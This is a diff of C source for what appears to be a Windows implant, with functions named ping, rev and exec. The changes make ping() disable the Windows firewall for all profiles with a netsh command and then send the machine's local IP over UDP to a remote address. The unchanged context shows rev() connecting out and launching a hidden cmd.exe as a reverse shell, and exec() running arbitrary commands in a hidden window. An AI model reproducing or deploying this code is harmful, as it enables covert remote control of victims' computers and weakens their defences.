@@ -1,51 +1,30 @@
 #include "femtocell.h"
 
+extern struct sockaddr_in* localaddr;
 
 void ping(char* ip)
 {
 	WSADATA wsaData;
 	SOCKET wSock;
 	struct sockaddr_in hax;
-	STARTUPINFO si;
-	PROCESS_INFORMATION pi;
 
-	// wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-	wSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	wSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 
-	// system("netsh adv set allprofiles state off");
+	system("netsh adv set allprofiles state off");
 
 	hax.sin_family = AF_INET;
-	hax.sin_port = htons(REV_PORT);
-	printf("%s ip", ip);
+	hax.sin_port = htons(PING_PORT);
 	hax.sin_addr.s_addr = inet_addr(ip);
+	//char* data = (char*)malloc(16);
+	//memset(data, 0, 16);
 
-	// if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
-	if (connect(wSock, (struct sockaddr*)&hax, sizeof(hax)))
-	{
-#ifdef DEBUG
-		printf("WSAConnnect Failed");
-		printf("%d", WSAGetLastError());
-#endif
-		// free(pst->ip);
-		return;
-	}
-	// 	printf("getting local data %s", inet_ntoa(localaddr->sin_addr));
-	// 	closesocket(wSock);
-		// localip = inet_ntoa(localaddr->sin_addr);
-		// WSABUF wbuf = {0};
-		// wbuf.len = strlen(localip);
-		// wbuf.buf = localip;
-		// DWORD sent;
-		// printf("sending data %s", localip);
-	// 	if (WSASend(wSock, &wbuf, 1, &sent, 0, NULL, NULL) == SOCKET_ERROR)
-	// 	{
-	// #ifdef DEBUG
-	// 		printf("wsa send failed");
-	// #endif
-	// 		// free(pst.ip);
-	// 		return;
-	// 	}
-		// closesocket(wSock);
+	char* data = inet_ntoa(localaddr->sin_addr);
+
+	int len = sendto(wSock, data, 16, 0, (struct sockaddr*)&hax, sizeof(hax));
+	closesocket(wSock);
+
+	//free(data);
+	//free(ip);
 }
 
 void rev(char* ip)
@@ -64,7 +43,7 @@ void rev(char* ip)
 
 	if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL))
 	{
-#ifdef DEBUG
+#ifdef _DEBUG
 		printf("WSAConnnect Failed");
 #endif
 		free(ip);
@@ -78,7 +57,7 @@ void rev(char* ip)
 
 	if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
 	{
-#ifdef DEBUG
+#ifdef _DEBUG
 		printf("CreateProcess failed (%d).\n", GetLastError());
 #endif
 		WaitForInputIdle(pi.hProcess, INFINITE);
@@ -100,7 +79,7 @@ void exec(char* cmd)
 
 	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
 	{
-#ifdef DEBUG
+#ifdef _DEBUG
 		printf("CreateProcess failed (%d).\n", GetLastError());
 #endif
 		WaitForInputIdle(pi.hProcess, INFINITE);
